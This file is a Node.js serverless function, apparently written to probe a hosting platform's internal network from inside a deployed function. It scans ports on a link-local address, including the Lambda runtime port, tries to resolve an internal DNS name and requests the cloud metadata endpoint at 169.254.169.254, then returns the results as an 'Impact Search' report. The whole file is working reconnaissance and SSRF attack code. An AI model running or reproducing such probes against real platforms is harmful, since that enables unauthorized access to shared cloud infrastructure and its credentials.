const http = require('http');
const net = require('net');

exports.handler = async (event, context) => {
  const impact = {};
  const targetIp = '169.254.100.5';

  // 1. Port Scanning
  const checkPort = (port) => new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(500);
    socket.on('connect', () => { socket.destroy(); resolve(true); });
    socket.on('timeout', () => { socket.destroy(); resolve(false); });
    socket.on('error', () => { socket.destroy(); resolve(false); });
    socket.connect(port, targetIp);
  });

  // Scan port: 53 (DNS), 80 (HTTP), 8080 (Proxy), 9001 (Lambda Runtime)
  const portsToScan = [53, 80, 8080, 9001];
  impact.open_ports = {};
  for (const port of portsToScan) {
    impact.open_ports[port] = await checkPort(port);
  }

  // 2. DNS Poisoning / Spoofing Test
  const dns = require('dns').promises;
  try {
    impact.dns_internal_query = await dns.resolve('netlify-internal.com');
  } catch (e) { impact.dns_internal_query = e.message; }

  // 3. SSRF Cloud Metadata (Alternative Path)
  const checkMetadataWithHeader = () => new Promise((resolve) => {
    const options = {
      hostname: '169.254.169.254',
      path: '/latest/meta-data/',
      headers: { 'Metadata-Flavor': 'Google' }, // Iseng kalau ternyata ini GCP-base
      timeout: 1000
    };
    http.get(options, (res) => resolve(`Found with Header! Status: ${res.statusCode}`))
        .on('error', (e) => resolve(`Failed: ${e.message}`));
  });
  impact.metadata_v2_test = await checkMetadataWithHeader();

  return {
    statusCode: 200,
    body: JSON.stringify({ message: "Impact Search", data: impact }, null, 2)
  };
};
